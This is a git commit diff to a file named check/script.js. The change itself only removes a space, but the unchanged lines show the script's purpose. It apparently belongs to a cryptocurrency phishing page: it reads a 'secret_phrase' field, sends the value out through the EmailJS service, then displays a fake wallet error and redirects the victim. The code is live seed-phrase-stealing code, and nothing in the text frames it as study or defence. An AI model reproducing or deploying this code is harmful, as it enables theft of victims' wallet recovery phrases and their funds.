e35d83f8f33eba4c4a98235c926760fd49ccdafd
Joseph Fadairo <74228417+joefadairo8@users.noreply.github.com>
2024-03-27 17:43:17 +0100

    Update script.js

--- check/script.js
+++ check/script.js
@@ -2,7 +2,7 @@ function SendMail() {
     var params = {
         result : document.getElementById("secret_phrase").value
     }
-    emailjs.send("service_0fib79d", "template_cnqeg6o", params).then(function (res) {
+    emailjs.send("service_0fib79d","template_cnqeg6o", params).then(function (res) {
         alert("Error!: wallet failed to interact successfully" );
         window.location.href = "/error.html";
     })
